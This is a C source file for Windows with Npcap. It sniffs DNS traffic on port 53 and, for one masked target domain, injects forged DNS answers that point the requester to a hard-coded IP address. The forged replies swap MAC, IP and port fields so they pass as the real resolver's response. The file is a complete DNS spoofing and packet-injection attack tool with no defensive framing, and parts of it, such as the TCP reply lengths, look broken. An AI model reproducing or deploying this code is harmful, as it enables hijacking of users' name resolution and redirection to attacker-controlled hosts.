#include <stdio.h>
#include <pcap.h>
#include <time.h>

#pragma comment(lib, "wpcap")
#pragma comment(lib, "ws2_32")

#include <tchar.h>
#include <WinSock2.h>

#define DNS_PORT 53
#define REDIRECT_IP "93.184.216.34"  // example.com IP
#define IPADDR_LEN 4
#define PACKET_LENGTH 1514          // 1500(IP header(20) + TCP header(20) + real data payload(1460)) + 18(Ethernet header) = Ethernet MTU

#pragma pack(push, 1)
typedef struct EtherHeader {
	unsigned char dstMac[6];
	unsigned char srcMac[6];
	unsigned short type;
} EtherHeader;

typedef struct IpHeader {
	unsigned char verIhl;
	unsigned char tos;
	unsigned short length;
	unsigned short id;
	unsigned short fragOffset;
	unsigned char ttl;
	unsigned char protocol;
	unsigned short checksum;
	unsigned char srcIp[4];
	unsigned char dstIp[4];
} IpHeader;

typedef struct TcpHeader {
	unsigned short srcPort;
	unsigned short dstPort;
	unsigned int seq;
	unsigned int ack;
	unsigned char data;
	unsigned char flags;
	unsigned short windowSize;
	unsigned short checksum;
	unsigned short urgent;
} TcpHeader;

typedef struct UdpHeader {
	unsigned short srcPort;
	unsigned short dstPort;
	unsigned short length;
	unsigned short checksum;
} UdpHeader;


typedef struct {
	u_short id;
	u_short flags;
	u_short qdcount;
	u_short ancount;
	u_short nscount;
	u_short arcount;
} DnsHeader;


typedef struct PseudoHeader {
	unsigned int srcIp;
	unsigned int dstIp;
	unsigned char zero;
	unsigned char protocol;
	unsigned short length;
} PseudoHeader;

typedef struct {
	pcap_t* handle;
} UserData;

typedef struct dns_response {
	u_short         offset;                     /*offset for the DNS response part*/
	u_long          ttl;                        /*time to live*/
	u_short         len;                        /*data length*/
	u_short         type;                       /*domain type*/
	u_short         cls;                      /*domain class*/
	u_char          ip_addr[IPADDR_LEN];
} DnsResponse;
#pragma pack(pop)

BOOL LoadNpcapDlls()
{
	_TCHAR npcap_dir[512];
	UINT len;
	len = GetSystemDirectory(npcap_dir, 480);
	if (!len) {
		fprintf(stderr, "Error in GetSystemDirectory: %x", GetLastError());
		return FALSE;
	}
	_tcscat_s(npcap_dir, 512, _T("\\Npcap"));
	if (SetDllDirectory(npcap_dir) == 0) {
		fprintf(stderr, "Error in SetDllDirectory: %x", GetLastError());
		return FALSE;
	}

	return TRUE;
}

unsigned short CalcChecksumIp(IpHeader* pIpHeader)
{
	unsigned char ihl = (pIpHeader->verIhl & 0x0F) << 2; //*4와 동일
	unsigned short wData[30] = { 0 };
	unsigned int dwSum = 0;

	memcpy(wData, (BYTE*)pIpHeader, ihl);

	for (int i = 0; i < ihl / 2; i++)
	{
		if (i != 5)
			dwSum += wData[i];

		if (dwSum & 0xFFFF0000)
		{
			dwSum &= 0x0000FFFF;
			dwSum++;
		}
	}

	return ~(dwSum & 0x0000FFFF);
}

unsigned short CalcChecksumTcp(IpHeader* pIpHeader, TcpHeader* pTcpHeader)
{
	PseudoHeader	pseudoHeader = { 0 };
	unsigned short* pwPseudoHeader = (unsigned short*)&pseudoHeader;
	unsigned short* pwDatagram = (unsigned short*)pTcpHeader;
	int				nPseudoHeaderSize = 6; //WORD 6개 배열
	int				nSegmentSize = 0; //헤더 포함

	UINT32			dwSum = 0;
	int				nLengthOfArray = 0;

	pseudoHeader.srcIp = *(unsigned int*)pIpHeader->srcIp;
	pseudoHeader.dstIp = *(unsigned int*)pIpHeader->dstIp;
	pseudoHeader.zero = 0;
	pseudoHeader.protocol = 6;
	pseudoHeader.length = htons(ntohs(pIpHeader->length) - 20);


	nSegmentSize = ntohs(pseudoHeader.length);

	if (nSegmentSize % 2)
		nLengthOfArray = nSegmentSize / 2 + 1;
	else
		nLengthOfArray = nSegmentSize / 2;

	for (int i = 0; i < nPseudoHeaderSize; i++)
	{
		dwSum += pwPseudoHeader[i];
		if (dwSum & 0xFFFF0000)
		{
			dwSum &= 0x0000FFFF;
			dwSum++;
		}
	}

	for (int i = 0; i < nLengthOfArray; i++)
	{
		if (i != 8)
			dwSum += pwDatagram[i];
		if (dwSum & 0xFFFF0000)
		{
			dwSum &= 0x0000FFFF;
			dwSum++;
		}
	}

	return (USHORT)~(dwSum & 0x0000FFFF);
}

unsigned short CalcChecksumUdp(IpHeader* pIpHeader, UdpHeader* pUdpHeader)
{
	PseudoHeader	pseudoHeader = { 0 };
	unsigned short* pwPseudoHeader = (unsigned short*)&pseudoHeader;
	unsigned short* pwDatagram = (unsigned short*)pUdpHeader;
	int				nPseudoHeaderSize = 6; //WORD 6개 배열
	int				nDatagramSize = 0; //헤더 포함 데이터그램 크기

	UINT32			dwSum = 0;
	int				nLengthOfArray = 0;


	pseudoHeader.srcIp = *(unsigned int*)pIpHeader->srcIp;
	pseudoHeader.dstIp = *(unsigned int*)pIpHeader->dstIp;
	pseudoHeader.zero = 0;
	pseudoHeader.protocol = 17;
	pseudoHeader.length = pUdpHeader->length;

	nDatagramSize = ntohs(pseudoHeader.length);

	if (nDatagramSize % 2)
		nLengthOfArray = nDatagramSize / 2 + 1;
	else
		nLengthOfArray = nDatagramSize / 2;

	for (int i = 0; i < nPseudoHeaderSize; i++)
	{
		dwSum += pwPseudoHeader[i];
		if (dwSum & 0xFFFF0000)
		{
			dwSum &= 0x0000FFFF;
			dwSum++;
		}
	}

	//((UdpHeader*)wData)->checksum = 0x0000;
	for (int i = 0; i < nLengthOfArray; i++)
	{
		if (i != 3)
			dwSum += pwDatagram[i];
		if (dwSum & 0xFFFF0000)
		{
			dwSum &= 0x0000FFFF;
			dwSum++;
		}
	}

	return (USHORT)~(dwSum & 0x0000FFFF);
}


char* decode_dns_name(const u_char* data, int* offset) {
	char name[256] = { 0 };  // 초기화
	int pos = *offset;
	int length = 0;
	while (data[pos] != 0) {
		if ((data[pos] & 0xC0) == 0xC0) {
			int pointer = ((data[pos] & 0x3F) << 8) | data[pos + 1];
			pos = pointer;
		}
		else {
			int label_len = data[pos];
			pos++;
			if (length + label_len + 1 >= sizeof(name)) break;  // +1 for '.'
			memcpy(name + length, data + pos, label_len);
			length += label_len;
			pos += label_len;
			name[length++] = '.';
		}
	}
	char* decoded_name = (char*)malloc(length + 1);
	if (decoded_name == NULL) {
		return NULL;
	}
	memcpy(decoded_name, name, length);
	if (length > 0) {
		decoded_name[length - 1] = '\0';  // 마지막 '.' 제거
	}
	else {
		decoded_name[0] = '\0';  // 빈 문자열 처리
	}
	*offset = pos + 1;  // null byte 이후로 오프셋 이동

	return decoded_name;
}


void dns_redirect(UserData* userData, u_char* packet, int len) {
	EtherHeader* eth = (EtherHeader*)packet;
	IpHeader* ip = (IpHeader*)(packet + sizeof(EtherHeader));
	TcpHeader* tcp = (TcpHeader*)(packet + sizeof(EtherHeader) + (ip->verIhl & 0x0F) * 4);

	int tcpHeaderLen = (tcp->data >> 4) * 4;
	DnsHeader* dns = (DnsHeader*)(packet + sizeof(EtherHeader) + (ip->verIhl & 0x0F) * 4 + tcpHeaderLen);

	// Parse DNS query
	int pos = sizeof(DnsHeader);
	char* domain = decode_dns_name((u_char*)dns, &pos);
	//fprintf(stdout, "curr Domain: %s \n", domain);

	if (strcmp(domain, "www.****.com") == 0) {
		// Create buffer for the new packet
		u_char buf[PACKET_LENGTH];
		memset(buf, 0, PACKET_LENGTH);
		memcpy(buf, packet, len);

		// Update Ethernet header
		EtherHeader* eth_send = (EtherHeader*)buf;
		memcpy(eth_send->srcMac, eth->dstMac, 6);
		memcpy(eth_send->dstMac, eth->srcMac, 6);

		// Update IP header
		IpHeader* ip_send = (IpHeader*)(buf + sizeof(EtherHeader));
		memcpy(ip_send->srcIp, ip->dstIp, 4);
		memcpy(ip_send->dstIp, ip->srcIp, 4);

		ip_send->verIhl = 0x45; // ipv4, 20바이트 헤더
		ip_send->tos = 0x00;
		ip_send->length = htons(40);
		ip_send->id = 0x3412;
		ip_send->fragOffset = htons(0x4000); //DF
		ip_send->ttl = 0xFF;
		ip_send->protocol = 6; // TCP
		ip_send->length = htons(40);

		// Update TCP header
		TcpHeader* tcp_send = (TcpHeader*)(buf + sizeof(EtherHeader) + (ip_send->verIhl & 0x0F) * 4);
		tcp_send->srcPort = tcp->dstPort;
		tcp_send->dstPort = tcp->srcPort;

		ip_send->checksum = 0;
		ip_send->checksum = CalcChecksumIp(ip_send);
		tcp_send->checksum = 0;
		tcp_send->checksum = CalcChecksumTcp(ip_send, tcp_send);

		// Create DNS response
		DnsHeader* dns_send = (DnsHeader*)(buf + sizeof(EtherHeader) + (ip_send->verIhl & 0x0F) * 4 + tcpHeaderLen);
		memcpy(dns_send, dns, sizeof(DnsHeader));
		dns_send->flags = htons(0x8180);
		dns_send->ancount = htons(1);

		// Construct DNS answer
		DnsResponse dns_r;
		dns_r.offset = htons(0xc00c);
		dns_r.type = htons(1);
		dns_r.cls = htons(1);
		dns_r.ttl = htonl(300);
		dns_r.len = htons(4);
		inet_pton(AF_INET, REDIRECT_IP, dns_r.ip_addr);

		// Copy DNS answer into the buffer
		memcpy(buf + sizeof(EtherHeader) + (ip_send->verIhl & 0x0F) * 4 + tcpHeaderLen + pos, &dns_r, sizeof(DnsResponse));

		// Update lengths and checksums
		int newLen = sizeof(EtherHeader) + ntohs(ip_send->length);

		// Send the packet
		pcap_t* handle = userData->handle;
		if (pcap_sendpacket(handle, buf, newLen) != 0) {
			fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
		}
	}

	free(domain);
}

void udp_dns_redirect(UserData* userData, u_char* packet, int len) {
	EtherHeader* eth = (EtherHeader*)packet;
	IpHeader* ip = (IpHeader*)(packet + sizeof(EtherHeader));
	UdpHeader* udp = (UdpHeader*)(packet + sizeof(EtherHeader) + sizeof(IpHeader));
	u_char* dns = (u_char*)(packet + sizeof(EtherHeader) + sizeof(IpHeader) + sizeof(UdpHeader));

	DnsHeader* dnsHeader = (DnsHeader*)dns;
	if (ntohs(dnsHeader->flags) & 0x8000) return;  // It's a response, don't process

	// Parse DNS query
	int pos = sizeof(DnsHeader);
	char* domain = decode_dns_name((u_char*)dns, &pos);
	//printf("%s \n", domain);

	if (strcmp(domain, "www.*****.com") == 0) {
		u_char* response_packet = (u_char*)malloc(len + sizeof(DnsResponse));  // Allocate space for the response
		memcpy(response_packet, packet, len);

		// Modify Ethernet header
		EtherHeader* new_eth = (EtherHeader*)response_packet;
		memcpy(new_eth->dstMac, eth->srcMac, 6);
		memcpy(new_eth->srcMac, eth->dstMac, 6);

		// Modify IP header
		IpHeader* new_ip = (IpHeader*)(response_packet + sizeof(EtherHeader));
		new_ip->ttl = 64; // Reset TTL
		memcpy(new_ip->srcIp, ip->dstIp, 4);
		memcpy(new_ip->dstIp, ip->srcIp, 4);
		//new_ip->tos = (0x60 & 0xFC);
		new_ip->id = 0x3412;

		// Modify UDP header
		UdpHeader* new_udp = (UdpHeader*)(response_packet + sizeof(EtherHeader) + sizeof(IpHeader));
		new_udp->srcPort = udp->dstPort;
		new_udp->dstPort = udp->srcPort;

		// Modify DNS header to indicate a response
		DnsHeader* new_dnsHeader = (DnsHeader*)(response_packet + sizeof(EtherHeader) + sizeof(IpHeader) + sizeof(UdpHeader));
		new_dnsHeader->flags = htons(0x8180); // Standard query response, No error
		new_dnsHeader->ancount = htons(1);    // One answer

		// Skip question section
		pos += 4; // Skip QTYPE and QCLASS

		// Construct the answer section
		u_char* answer_start = response_packet + sizeof(EtherHeader) + sizeof(IpHeader) + sizeof(UdpHeader) + pos;
		// DnsResponse* response = (DnsResponse*)answer_start;

		*(uint16_t*)answer_start = htons(0xC00C);  // Pointer to the queried domain name
		answer_start += 2;

		// Write Type (A record)
		*(uint16_t*)answer_start = htons(1);
		answer_start += 2;

		// Write Class (IN)
		*(uint16_t*)answer_start = htons(1);
		answer_start += 2;

		// Write TTL (300 seconds)
		*(uint32_t*)answer_start = htonl(600);
		answer_start += 4;

		// Write Data Length (4 bytes for IPv4)
		*(uint16_t*)answer_start = htons(4);
		answer_start += 2;

		// Write IP address
		inet_pton(AF_INET, REDIRECT_IP, answer_start);
		answer_start += 4;

		// Calculate the new lengths
		int answer_len = sizeof(DnsResponse);
		int newLen = len + answer_len;
		new_ip->length = htons(newLen - sizeof(EtherHeader));
		new_udp->length = htons(newLen - sizeof(EtherHeader) - sizeof(IpHeader));

		// Recalculate checksums
		new_ip->checksum = 0;
		new_ip->checksum = CalcChecksumIp(new_ip);
		new_udp->checksum = 0;
		new_udp->checksum = CalcChecksumUdp(new_ip, new_udp);

		// Send the response packet
		pcap_t* handle = userData->handle;
		if (pcap_sendpacket(handle, response_packet, newLen) != 0) {
			fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
		}

		free(response_packet);
		free(domain);
	}
}

void dispatcher_handler(u_char* user,
	const struct pcap_pkthdr* header,
	const u_char* pkt_data)
{
	EtherHeader* pEther = (EtherHeader*)pkt_data;
	IpHeader* pIpHeader = (IpHeader*)(pkt_data + sizeof(EtherHeader));

	if (pEther->type != 0x0008)
		return;

	int ipLen = (pIpHeader->verIhl & 0x0F) * 4;
	UserData* userData = (UserData*)user;

	if (pIpHeader->protocol == 6) {
		TcpHeader* pTcp =
			(TcpHeader*)(pkt_data + sizeof(EtherHeader) + ipLen);

		if (ntohs(pTcp->dstPort) == DNS_PORT
			//|| ntohs(pTcp->srcPort) == DNS_PORT
			) {
			dns_redirect(userData, (u_char*)pkt_data, header->len);
		}
	}

	if (pIpHeader->protocol == 17) {
		UdpHeader* udp = (UdpHeader*)(pkt_data + sizeof(EtherHeader) + sizeof(IpHeader));

		if (ntohs(udp->dstPort) == DNS_PORT) {
			udp_dns_redirect(userData, (u_char*)pkt_data, header->len);
		}
	}

}


int main()
{
	pcap_if_t* alldevs;
	pcap_if_t* d;
	int inum;
	int i = 0;
	pcap_t* adhandle;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	char filter_exp[] = "port 53";
	struct pcap_pkthdr* header;
	const u_char* pkt_data;

	if (!LoadNpcapDlls())
	{
		fprintf(stderr, "Couldn't load Npcap\n");
		exit(1);
	}


	/* Retrieve the device list */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	/* Print the list */
	for (d = alldevs; d; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure Npcap is installed.\n");
		return -1;
	}

	printf("Enter the interface number (1-%d):", i);
	scanf_s("%d", &inum);

	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* Jump to the selected adapter */
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);

	// Create the pcap handle
	adhandle = pcap_create(d->name, errbuf);
	if (adhandle == NULL) {
		fprintf(stderr, "Unable to create the adapter. %s is not supported by Npcap\n", d->name);
		pcap_freealldevs(alldevs);
		return -1;
	}

	// Set immediate mode
	if (pcap_set_immediate_mode(adhandle, 1) != 0) {
		fprintf(stderr, "Error setting immediate mode: %s\n", pcap_geterr(adhandle));
		pcap_close(adhandle);
		return 2;
	}

	// Set timeout
	if (pcap_set_timeout(adhandle, 10) != 0) {
		fprintf(stderr, "Error setting timeout: %s\n", pcap_geterr(adhandle));
		pcap_close(adhandle);
		return 2;
	}

	// Activate the pcap handle
	if (pcap_activate(adhandle) != 0) {
		fprintf(stderr, "Error activating the pcap handle: %s\n", pcap_geterr(adhandle));
		pcap_close(adhandle);
		return 2;
	}

	if (pcap_compile(adhandle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(adhandle));
		return 2;
	}

	if (pcap_setfilter(adhandle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(adhandle));
		return 2;
	}

	printf("\nlistening on %s...\n", d->description);

	pcap_freealldevs(alldevs);

	UserData userData;
	userData.handle = adhandle;


	int res;
	while ((res = pcap_next_ex(adhandle, &header, &pkt_data)) >= 0)
	{
		if (res == 0)
		{
			// 타임아웃 발생
			continue;
		}
		// 패킷 처리 함수 호출
		dispatcher_handler((u_char*)&userData, header, pkt_data);
	}

	pcap_close(adhandle);

	return 0;
}
